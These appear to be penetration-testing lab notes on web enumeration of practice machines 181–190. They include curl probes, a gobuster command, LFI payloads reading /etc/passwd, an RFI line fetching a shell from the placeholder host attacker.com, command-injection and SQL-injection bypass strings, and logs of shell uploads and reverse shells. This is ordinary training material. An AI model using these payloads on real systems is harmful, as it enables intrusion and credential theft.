## 🌐 Web Enumeration (Machines 181–190)

### Common Checks

```bash
# Look for admin/config/backup paths
curl -I http://<IP>/admin.php
curl -I http://<IP>/config.php
curl -I http://<IP>/backup

# Test default credentials
# Examples: admin:admin, root:root, user:user
```

### Directory Brute-Forcing

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

### LFI/RFI Testing

```bash
curl http://<IP>/vuln.php?page=../../../../etc/passwd
curl http://<IP>/vuln.php?page=http://attacker.com/shell.txt
```

### Command Injection

```bash
curl http://<IP>/vuln.php?cmd=;id
curl http://<IP>/vuln.php?cmd=|whoami
```

### Notes Extracted (181–190)

- **Machine 181**: Found `/admin` login → Login panel default creds `admin:admin` worked.
- **Machine 182**: `.git` folder exposed → Extracted source → Found hardcoded DB creds.
- **Machine 183**: `/uploads` folder open → Uploaded `.php` shell and executed.
- **Machine 184**: Config file exposed `/config.php` → DB password dump.
- **Machine 185**: LFI via `?page=` parameter → Read `/etc/passwd`.
- **Machine 186**: Command injection in GET param → Spawned reverse shell.
- **Machine 187**: Found backup ZIP at `/backup.zip` → Contained full site with credentials.
- **Machine 188**: Custom login → SQLi bypass using `' OR '1'='1`.
- **Machine 189**: Admin login had default password `root:toor`.
- **Machine 190**: JavaScript file in `/static/creds.js` contained base64-encoded credentials.
